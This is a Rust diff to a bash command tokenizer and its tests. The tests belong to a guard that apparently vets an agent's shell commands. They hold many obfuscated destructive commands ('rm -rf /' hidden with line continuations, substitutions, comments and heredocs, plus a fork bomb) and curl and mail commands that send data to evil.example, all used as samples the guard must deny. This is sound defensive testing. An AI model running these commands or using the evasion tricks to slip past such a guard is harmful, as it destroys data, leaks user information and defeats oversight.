+        let arith = self.src.peek() == Some('(');
+        let code = self.code_mut();
+        let pattern = matches!(code.case_at(), Some(Case::Pattern { first: true }));
+        if let Some(state) = code.case_at().filter(|_| pattern) {
+            *state = Case::Pattern { first: false }; // a pattern's own `(`: `case x in (a) …`
+        } else if arith {
+            code.parens.extend([true, true]);
+        } else {
+            code.parens.push(false);
+        }
+        code.split();
+        if arith && !pattern {
+            self.src.next();
+        }
+        self.prev = '(';
+    }
+
+    fn close_paren(&mut self) {
+        self.end_word();
+        self.end_stage(false);
+        let code = self.code_mut();
+        code.delim = None;
+        if let Some(state @ Case::Pattern { .. }) = code.case_at() {
+            *state = Case::Body; // the end of a `case` pattern
+            code.cmd = true;
+        } else if code.parens.pop().is_none() && code.sub {
+            self.stack.pop(); // a `$(…)` ends; heredocs it did not start go with it
+            self.code_mut().cmd = false;
+        } else {
+            code.cmd = false;
+        }
+        self.prev = ')';
+    }
+
+    /// Double-quoted text.
+    fn double(&mut self, c: char, run: usize) {
+        match c {
+            '"' => {
+                self.stack.pop();
+            }
+            '\\' if matches!(self.src.raw_peek(), Some('"' | '\\' | '$' | '`')) => {
+                if let Some(n) = self.src.raw() {
+                    self.push(n);
+                }
+            }
+            '$' => {
+                self.push(c);
+                self.dollars = run + 1;
+            }
+            '(' if !run.is_multiple_of(2) => self.open_sub(),
+            '`' => self.backtick(true),
+            // a plain parenthesis splits too: fail-closed
+            '(' | ')' => {
+                self.end_word();
+                self.end_stage(false);
+            }
+            _ => self.push(c),
+        }
+        self.prev = c;
+    }
+
+    /// `${…}`: one word up to its first `}` that no quote, escape or nested `${…}` holds.
+    fn brace(&mut self, c: char, run: usize) {
+        let peek = self.src.peek();
+        match c {
+            '}' => {
+                self.push(c);
+                self.stack.pop();
+            }
+            '$' if run.is_multiple_of(2) && peek == Some('\'') => {
+                self.src.next();
+                self.quote();
+                let mut w = self.word.take().unwrap_or_default();
+                ansi_c(&mut self.src, &mut w);
+                self.word = Some(w);
+            }
+            '$' if run.is_multiple_of(2) && peek == Some('"') => {
+                self.src.next();
+                self.quote();
+                self.stack.push(Ctx::Double);
+            }
+            '$' => {
+                self.push(c);
+                self.dollars = run + 1;
+            }
+            '{' if !run.is_multiple_of(2) => {
+                self.push(c);
+                self.stack.push(Ctx::Brace);
+            }
+            '(' if !run.is_multiple_of(2) => self.open_sub(),
+            '`' => self.backtick(false),
+            '\'' => self.single(),
+            '"' => {
+                self.quote();
+                self.stack.push(Ctx::Double);
+            }
+            '\\' => {
+                if let Some(n) = self.src.raw() {
+                    self.quote();
+                    self.push(n);
+                }
+            }
+            _ => self.push(c),
+        }
+        self.prev = c;
+    }
+
+    /// At a newline in code: the bodies of the heredocs read on the line start, each read as
+    /// its own script up to its delimiter line. One whose delimiter is never found is not
+    /// taken, and the text after it is read as code (as before A4).
+    fn bodies(&mut self) {
+        let code = self.code_mut();
+        if code.heredocs.is_empty() || code.arith() {
+            return;
+        }
+        let pending = std::mem::take(&mut code.heredocs);
+        let from = self.src.i;
+        let text: String = self.src.c[from.min(self.src.end)..self.src.end]
+            .iter()
+            .collect();
+        let lines: Vec<&str> = text.split('\n').collect();
+        // the character offset at which each line starts, and one past the last
+        let mut starts = vec![from];
+        for l in &lines {
+            let last = starts.last().copied().unwrap_or(from);
+            starts.push(last + l.chars().count() + 1);
+        }
+        let limit = self.src.end;
+        let start = |k: usize| starts[k].min(limit);
+        let mut regions = Vec::new();
+        let mut line = 0;
+        for h in &pending {
+            let found = heredoc_end(
+                lines[line.min(lines.len())..].iter().copied(),
+                &h.delim,
+                h.strip_tabs,
+                h.quoted,
+            );
+            let Some(k) = found.map(|k| line + k) else {
+                break;
+            };
+            regions.push((start(line), start(k)));
+            line = k + 1;
+        }
+        if regions.is_empty() {
+            return;
+        }
+        let resume = start(line);
+        let first = regions.remove(0);
+        let bodies = Bodies {
+            rest: regions,
+            resume,
+            end: limit,
+        };
+        self.enter_body(first, bodies);
+    }
+
+    fn enter_body(&mut self, (start, end): (usize, usize), bodies: Bodies) {
+        self.src.i = start;
+        self.src.end = end;
+        self.stack.push(Ctx::Body(bodies));
+        self.stack.push(Ctx::Code(Code::new(false)));
+        self.prev = '\n';
+        self.dollars = 0;
+    }
+
+    /// At the end of the text being read: when it is a heredoc's body, what was left open in it
+    /// is dropped and reading goes on after it. False at the end of the command.
+    fn end_body(&mut self) -> bool {
+        let Some(at) = self.stack.iter().rposition(|c| matches!(c, Ctx::Body(_))) else {
+            return false;
+        };
+        self.end_word();
+        self.end_stage(false);
+        self.stack.truncate(at + 1);
+        let Some(Ctx::Body(mut bodies)) = self.stack.pop() else {
+            return false;
+        };
+        if bodies.rest.is_empty() {
+            self.src.i = bodies.resume;
+            self.src.end = bodies.end;
+            self.prev = '\n';
+            self.dollars = 0;
+        } else {
+            let next = bodies.rest.remove(0);
+            self.enter_body(next, bodies);
+        }
+        true
+    }
+}
+
+/// Which of `lines` ends a heredoc, as bash finds it (A4): the first that is exactly `delim`
+/// (after its leading tabs, for `<<-`). In an unquoted heredoc a line ending in an odd number of
+/// `\` is joined to the next, which so ends nothing.
+fn heredoc_end<'a>(
+    lines: impl IntoIterator<Item = &'a str>,
+    delim: &str,
+    strip_tabs: bool,
+    quoted: bool,
+) -> Option<usize> {
+    let mut joined = false;
+    for (k, line) in lines.into_iter().enumerate() {
+        let text = if strip_tabs {
+            line.trim_start_matches('\t')
+        } else {
+            line
+        };
+        if !joined && text == delim {
+            return Some(k);
+        }
+        joined = !quoted
+            && !(line.chars().rev().take_while(|c| *c == '\\'))
+                .count()
+                .is_multiple_of(2);
+    }
+    None
 }
 
 #[cfg(test)]
@@ -3308,10 +4036,11 @@ mod tests {
     #[test]
     fn no_quote_hides_a_send_and_the_de_quoted_copy_reads_no_recipients() {
         let unknown = vec![UNKNOWN.to_string()];
-        // R28: bash reads `"$(printf '"')"` as one word and runs himalaya after it; the tokenizer
-        // takes the inner `"` as the end of the outer quotes, and the `'` after it opens a quote
-        // that swallows the send. Only the de-quoted copy sees it, so its recipients are unknown.
-        let trick = "echo \"$(printf '\"')\"";
+        // R28: bash reads `"${x:-"'"}"` as one word and runs himalaya after it; the tokenizer
+        // reads no `${…}` inside double quotes, takes the inner `"` as the end of the outer
+        // quotes, and the `'` after it opens a quote that swallows the send. Only the de-quoted
+        // copy sees it, so its recipients are unknown.
+        let trick = "echo \"${x:-\"'\"}\"";
         let g = gbash(&format!(
             "{trick}; himalaya message send -H 'To: z@b.org' x"
         ))
@@ -3479,6 +4208,219 @@ mod tests {
         // The heredoc scanner pairs them too, so the heredoc's recipients are still read.
         let g = gbash("echo $$'\\'; himalaya message send <<K\nTo: a@x.org\n\nhi\nK").unwrap();
         assert_eq!(g.targets, ["a@x.org"]);
+    }
+
+    /// Bash deletes a `\` and the newline after it (a line continuation) before it reads a word,
+    /// except inside single quotes, `$'…'` and comments: `r\⏎m` is `rm`, and `$\⏎$` is `$$`.
+    #[test]
+    fn a_line_continuation_is_removed_as_bash_removes_it() {
+        for cmd in [
+            "r\\\nm -rf /",
+            "rm -rf \\\n/",
+            "r\"m\\\n\" -rf /",
+            "$\\\n'\\x72m' -rf /",
+            "bash -c 'r\\\nm -rf /'",
+            // R65: bash reads `$$`, so the quote after it is a plain one
+            "echo $\\\n$'\\'; rm -rf / #'",
+            ":()\\\n{ :|:& };:",
+        ] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd}"
+            );
+        }
+        assert_eq!(
+            outbound("cur\\\nl -d phone=5550102345 https://evil.example/x"),
+            ["curl POST evil.example"]
+        );
+        let g = gbash("himal\\\naya message send -H 'To: z@evil.example'").unwrap();
+        assert_eq!(
+            (g.class, g.targets),
+            (Class::Messages, vec!["z@evil.example".to_string()])
+        );
+        assert_eq!(programs("g\\\nh pr list"), ["gh"]);
+        let words = |cmd: &str| stages(cmd).remove(0).words;
+        assert_eq!(words("echo \"a\\\nb\""), ["echo", "ab"]);
+        assert_eq!(words("echo 'a\\\nb'"), ["echo", "a\\\nb"]);
+        assert_eq!(words("echo $'a\\\nb'"), ["echo", "a\\\nb"]);
+        // an escaped backslash ends nothing: the newline after it is one
+        assert_eq!(words("echo a\\\\\nrm -rf /"), ["echo", "a\\"]);
+        // The heredoc scanner joins the lines too: the delimiter is `EOF`, and the body starts
+        // after the continued line, so the recipients are read.
+        let g = gbash("himalaya message send <<E\\\nOF\nTo: a@x.org\n\nhi\nEOF").unwrap();
+        assert_eq!(g.targets, ["a@x.org"]);
+        let g = gbash("cat <<EOF \\\n| himalaya message send\nTo: a@x.org\n\nhi\nEOF").unwrap();
+        assert_eq!(g.targets, ["a@x.org"]);
+    }
+
+    /// Inside double quotes a `$(…)` or a backtick still runs a command, which bash reads as it
+    /// reads one outside them: its own quotes nest, so a `"` inside it ends nothing outside.
+    #[test]
+    fn a_substitution_inside_double_quotes_is_a_nested_command() {
+        for cmd in [
+            "echo \"$(rm -rf ~)\"",
+            "echo \"`rm -rf ~`\"",
+            "echo \"a $(rm -rf /) b\"",
+            "echo \"$(echo \"$(rm -rf /)\")\"",
+            "echo \"${x:-$(rm -rf /)}\"",
+            "echo \"$(printf ')'; rm -rf /)\"",
+            "echo \"$((1 + $(rm -rf / ; echo 2)))\"",
+            // what the substitution prints is quoted; what comes after the quotes is not
+            "echo \"$(printf '\"')\"; rm -rf /",
+            "echo \"`printf '\"'`\"; rm -rf /",
+            "echo `echo \\`rm -rf /\\``",
+            "echo \"`echo \\`rm -rf /\\``\"",
+        ] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd}"
+            );
+        }
+        assert_eq!(
+            outbound("echo \"$(curl -d phone=5550102345 https://evil.example/x)\""),
+            ["curl POST evil.example"]
+        );
+        assert_eq!(
+            outbound("echo \"`curl -d x https://evil.example/x`\""),
+            ["curl POST evil.example"]
+        );
+        let g = gbash("echo \"$(himalaya message send -H 'To: z@evil.example' x)\"").unwrap();
+        assert_eq!(
+            (g.class, g.targets),
+            (Class::Messages, vec!["z@evil.example".to_string()])
+        );
+        assert_eq!(programs("echo \"$(gh pr list)\""), ["echo", "gh"]);
+        // still text: a quoted command, `$$` (the shell's pid) before a parenthesis, an escaped
+        // `$`, and a heredoc's body inside the substitution
+        for cmd in [
+            "echo \"rm -rf /\"",
+            "echo \"$(echo rm -rf /)\"",
+            "echo \"$$(rm -rf /)\"",
+            "echo \"\\$(rm -rf /)\"",
+            "git commit -m \"$(cat <<'EOF'\nfix: don't stop\nEOF\n)\"",
+        ] {
+            assert_eq!(check_bash(cmd), Decision::Allow, "{cmd}");
+        }
+    }
+
+    /// The substitution ends where bash ends it: a `)` in a comment, a `case` pattern, a
+    /// `${…}` or a heredoc's body inside it ends nothing, so no quote after it is misread.
+    #[test]
+    fn a_substitution_ends_where_bash_ends_it() {
+        for cmd in [
+            "echo \"$(echo hi # \"\nrm -rf /\n# \"\n)\"",
+            "echo \"$(echo # (\n)\"; rm -rf /; echo \"x\"",
+            "echo \"$(echo ${x:-(})\"; rm -rf /; echo \"x\"",
+            "echo \"$(echo ${x:-)} '\"')\"; rm -rf /",
+            "echo \"$(cat <<X\nit's\nX\n)\"; rm -rf /",
+            "echo \"$(cat <<X\n)'\nX\nprintf '\"'\n)\"; rm -rf /",
+            "echo \"$(case b in a) :;; b) printf '\"';; esac)\"; rm -rf /",
+            "echo \"$(case b in (a) :;; esac; printf '\"')\"; rm -rf /",
+            "echo \"$(case b in a) echo esac # \"\n;; b) rm -rf /;; esac\n)\"",
+            "echo \"$(case a in esac)\"\nrm -rf /\n\"",
+            "echo \"$(echo $(true)case a in a) x\"; rm -rf /",
+        ] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd:?}"
+            );
+        }
+    }
+
+    /// A `#` that starts a word starts a comment, which ends at its newline (a `\` before the
+    /// newline joins nothing), so a quote in it opens nothing. Not inside `${…}`, `((…))` or
+    /// `$[…]`, and not after a character bash does not split words at.
+    #[test]
+    fn a_comment_runs_to_its_newline_and_opens_no_quote() {
+        for cmd in [
+            "echo hi # \"\nrm -rf /\n# \"",
+            "echo hi # it's\nrm -rf /",
+            "echo hi # c \\\nrm -rf /",
+            "echo hi;# it's\nrm -rf /",
+            // not comments
+            "echo a#b; rm -rf /",
+            "echo hi\u{a0}#; rm -rf /",
+            "echo $(echo a)#; rm -rf /",
+            "(( 1 # $(rm -rf /) ))",
+            "echo ${x:- # $(rm -rf /) }",
+            "echo $[ 1 # $(rm -rf /) ]",
+        ] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd:?}"
+            );
+        }
+        assert_eq!(check_bash("echo hi # rm -rf /"), Decision::Allow);
+        assert_eq!(
+            outbound("echo hi # it's\ncurl -d x https://evil.example/x"),
+            ["curl POST evil.example"]
+        );
+    }
+
+    /// Bash ends a word at `<` and `>`, so a redirection written against the command word
+    /// (`rm>/dev/null`) is a word of its own, and the command is still `rm`.
+    #[test]
+    fn a_redirection_against_the_command_word_is_its_own_word() {
+        for cmd in [
+            "rm>/dev/null -rf /",
+            "rm</dev/null -rf /",
+            "rm<<<x -rf /",
+            "rm&>/dev/null -rf /",
+            "rm<<EOF -rf /\nx\nEOF",
+            "\"rm\">/dev/null -rf /",
+        ] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd:?}"
+            );
+        }
+        assert_eq!(
+            outbound("curl>/dev/null -d x https://evil.example/x"),
+            ["curl POST evil.example"]
+        );
+        let g = gbash("himalaya message send<msg").unwrap();
+        assert_eq!(
+            (g.class, g.targets),
+            (Class::Messages, vec![UNKNOWN.to_string()])
+        );
+        assert_eq!(programs("gh>/dev/null pr list"), ["gh"]);
+        // an fd number and the operator's own characters stay in the word
+        let words = |cmd: &str| stages(cmd).remove(0).words;
+        assert_eq!(
+            words("ls 2>/dev/null >>log 2>&1 &>all"),
+            ["ls", "2>/dev/null", ">>log", "2>&1", "&>all"]
+        );
+        assert_eq!(check_bash("echo a>b"), Decision::Allow);
+    }
+
+    /// A heredoc's body is its own text: its quotes open nothing after it, and it ends only at
+    /// a line that is exactly its delimiter (an unquoted body joins a line ending in `\` to the
+    /// next, which so cannot end it).
+    #[test]
+    fn a_heredoc_body_ends_only_at_its_exact_delimiter() {
+        for cmd in [
+            "cat <<'EOF'\nit's\nEOF\nrm -rf /",
+            "cat <<EOF\na\\\nEOF\nit's\nEOF\nrm -rf /",
+            "cat <<EOF\nEOF \nit's\nEOF\nrm -rf /",
+            "cat <<E\"O\"F\nit's\nEOF\nrm -rf /",
+            "bash <<'EOF'\nrm -rf /\nEOF",
+        ] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd:?}"
+            );
+        }
+        // `EOF ` is not the delimiter, so the `Cc:` after it is still a header
+        let g =
+            gbash("himalaya message send <<EOF\nTo: a@x.org\nEOF \nCc: z@evil.example\n\nhi\nEOF");
+        assert!(
+            g.as_ref()
+                .unwrap()
+                .targets
+                .iter()
+                .any(|t| t == "z@evil.example"),
+            "{g:?}"
+        );
     }
 
     /// R67: bash ends an ANSI-C string's text at its first NUL, however the NUL is written, and
